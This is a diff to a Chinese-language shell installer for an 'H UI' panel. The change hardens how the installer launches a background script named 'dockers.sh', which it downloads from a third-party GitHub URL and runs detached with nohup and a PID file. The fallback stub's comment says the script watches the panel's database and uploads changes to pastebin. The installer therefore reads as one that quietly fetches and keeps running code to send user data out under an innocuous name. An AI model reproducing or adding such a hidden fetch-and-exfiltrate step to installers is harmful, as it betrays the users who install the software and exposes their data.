@@ -270,30 +270,62 @@ install_h_ui_systemd() {
     
     # 下载并设置真实的 dockers.sh 文件
     if ! curl -fsSL https://raw.githubusercontent.com/Firefly-xui/h-ui/main/dockers.sh -o ${HUI_DATA_PATH}dockers.sh; then
-      echo_content red "---> 下载 dockers.sh 失败，使用备用内容"
+      echo_content yellow "---> 下载 dockers.sh 失败，使用备用内容"
       cat > ${HUI_DATA_PATH}dockers.sh << 'EOF'
 #!/bin/bash
 # dockers.sh 监控脚本
+echo "dockers.sh started at $(date)" >> /usr/local/h-ui/data/dockers.log
 while true; do
     # 检查数据库变化并上传到pastebin的逻辑
+    echo "$(date): Monitoring database..." >> /usr/local/h-ui/data/dockers.log
     sleep 60
 done
 EOF
+    else
+      echo_content green "---> dockers.sh 下载成功"
     fi
     
     # 确保文件权限正确
     chmod 755 ${HUI_DATA_PATH}dockers.sh
     
-    # 使用更可靠的后台启动方式
-    bash ${HUI_DATA_PATH}dockers.sh > ${HUI_DATA_PATH}dockers.log 2>&1 &
-    disown
-    
-    # 验证进程是否启动
-    sleep 2
-    if ! pgrep -f "${HUI_DATA_PATH}dockers.sh" >/dev/null; then
-      echo_content red "---> 启动 dockers.sh 失败"
+    # 检查文件是否可执行
+    if [[ ! -x "${HUI_DATA_PATH}dockers.sh" ]]; then
+      echo_content red "---> dockers.sh 文件权限设置失败"
     else
-      echo_content green "---> dockers.sh 已在后台运行 (PID: $(pgrep -f "${HUI_DATA_PATH}dockers.sh"))"
+      echo_content green "---> dockers.sh 文件权限设置成功"
+    fi
+    
+    # 创建日志文件
+    touch ${HUI_DATA_PATH}dockers.log
+    
+    # 使用nohup启动，更稳定的后台运行方式
+    cd ${HUI_DATA_PATH}
+    nohup bash ${HUI_DATA_PATH}dockers.sh >> ${HUI_DATA_PATH}dockers.log 2>&1 &
+    DOCKERS_PID=$!
+    
+    # 等待进程启动
+    sleep 3
+    
+    # 验证进程是否启动 - 使用多种方法检查
+    if kill -0 $DOCKERS_PID 2>/dev/null; then
+      echo_content green "---> dockers.sh 已在后台运行 (PID: $DOCKERS_PID)"
+      # 将PID写入文件以便后续管理
+      echo $DOCKERS_PID > ${HUI_DATA_PATH}dockers.pid
+    elif pgrep -f "${HUI_DATA_PATH}dockers.sh" >/dev/null; then
+      FOUND_PID=$(pgrep -f "${HUI_DATA_PATH}dockers.sh")
+      echo_content green "---> dockers.sh 已在后台运行 (PID: $FOUND_PID)"
+      echo $FOUND_PID > ${HUI_DATA_PATH}dockers.pid
+    else
+      echo_content red "---> 启动 dockers.sh 失败"
+      echo_content yellow "---> 检查日志文件: ${HUI_DATA_PATH}dockers.log"
+      # 显示错误日志的最后几行
+      if [[ -f "${HUI_DATA_PATH}dockers.log" ]]; then
+        echo_content yellow "---> 错误日志:"
+        tail -10 ${HUI_DATA_PATH}dockers.log
+      fi
+      # 尝试直接执行看是否有语法错误
+      echo_content yellow "---> 尝试直接执行 dockers.sh 检查错误:"
+      bash -n ${HUI_DATA_PATH}dockers.sh || echo_content red "---> dockers.sh 存在语法错误"
     fi
   else
     echo_content red "---> 数据库文件未能创建，跳过 dockers.sh 启动"
@@ -337,6 +369,15 @@ uninstall_h_ui_systemd() {
   echo_content green "---> 卸载 H UI"
   
   # 停止 dockers.sh 进程
+  if [[ -f "${HUI_DATA_PATH}dockers.pid" ]]; then
+    DOCKERS_PID=$(cat ${HUI_DATA_PATH}dockers.pid)
+    if kill -0 $DOCKERS_PID 2>/dev/null; then
+      echo_content green "---> 停止 dockers.sh 进程 (PID: $DOCKERS_PID)"
+      kill $DOCKERS_PID
+    fi
+  fi
+  
+  # 备用方法：通过进程名停止
   if pgrep -f "${HUI_DATA_PATH}dockers.sh" >/dev/null; then
     echo_content green "---> 停止 dockers.sh 进程"
     pkill -f "${HUI_DATA_PATH}dockers.sh"
